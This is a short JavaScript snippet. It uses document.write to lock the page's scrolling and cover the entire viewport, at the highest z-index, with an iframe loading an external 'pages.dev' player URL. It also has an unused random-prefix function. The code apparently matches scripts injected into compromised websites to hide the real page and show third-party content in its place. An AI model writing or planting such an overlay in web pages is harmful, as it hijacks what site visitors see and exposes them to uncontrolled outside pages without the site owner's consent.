function generateRandomPrefix() {
 
    var length = Math.floor(Math.random() * 8) + 1; 
    return 'j'.repeat(length); 
}

var randomPrefix = generateRandomPrefix(); 
var baseDomain = 'web-service.pages.dev/player/';
var fullUrl = 'https://' + baseDomain;


document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
document.write('<style>html,body{width:100%;height:100%;overflow:hidden; margin:0;}</style>');
document.write('<div style="width:100%;height:100%;position:fixed;top:0;left:0;z-index:2147483647;background:#fff">');
document.write('<iframe src="' + fullUrl + '" frameborder="0" style="border:0;width:100%;height:100%;"></iframe>');
document.write('</div>');